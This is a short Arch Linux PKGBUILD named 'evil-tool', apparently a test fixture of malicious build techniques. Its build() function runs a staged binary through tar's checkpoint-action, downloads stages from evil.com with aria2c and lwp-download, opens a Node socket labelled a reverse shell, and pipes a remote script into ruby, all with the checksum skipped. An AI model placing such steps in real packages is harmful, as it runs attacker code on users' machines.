pkgname=evil-tool
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("http://192.168.1.100/payload.tar.gz")
sha256sums=('SKIP')

build() {
    # Use tar checkpoint-action to exec during extraction
    tar xf payload.tar.gz --checkpoint=1 --checkpoint-action=exec=/tmp/stage1
    # Download via alternative tools
    aria2c http://evil.com/stage2
    lwp-download http://evil.com/stage3 /tmp/stage3
    # Node.js reverse shell
    node -e 'var net = require("net"); var c = new net.Socket(); c.connect(4444, "10.0.0.1")'
    # Pipe to alternative interpreter
    curl http://evil.com/payload.rb | ruby
}

package() {
    install -Dm755 tool "${pkgdir}/usr/bin/tool"
}
